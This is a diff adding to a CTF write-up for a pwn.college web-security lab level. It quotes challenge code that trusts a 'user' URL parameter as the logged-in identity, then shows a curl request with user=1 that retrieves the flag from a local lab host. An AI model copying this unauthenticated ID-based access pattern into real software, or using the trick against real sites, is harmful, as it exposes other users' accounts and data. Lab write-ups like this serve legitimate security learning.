@@ -144,10 +144,47 @@ uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
 
 
 ## Web-security level 3
-```sh
+* Analysing the file `/challenge/run`, here in `level3`there are two if conditions.
 
+```py
+def level3():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? as password'),
+               (flag,))
+
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        assert username, "Missing `username` form"
+        assert password, "Missing `password` form"
+
+        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+        assert user, "Invalid `username` or `password`"
+
+        return redirect(request.path, user=int(user["rowid"]))
+
+    if "user" in request.args:
+        user_id = int(request.args["user"])
+        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
+        if user:
+            username = user["username"]
+            if username == "flag":
+                return f"{flag}\n"
+            return f"Hello, {username}!\n"
+
+    return form(["username", "password"])
 ```
+* at the end of first if condition we can see it return to requestd path with parameter `user` and `rowid` which may be user id in this case.
+
+* when i use the curl with the parameter `user=1` i got the flag.
+
+```sh
+hacker@web-security-level-3:~$ curl http://challenge.localhost:80?user=1
+pwn.college{Flag_here} 
+```
+
 ## Web-security level 4
+
 ```sh
 
 ```
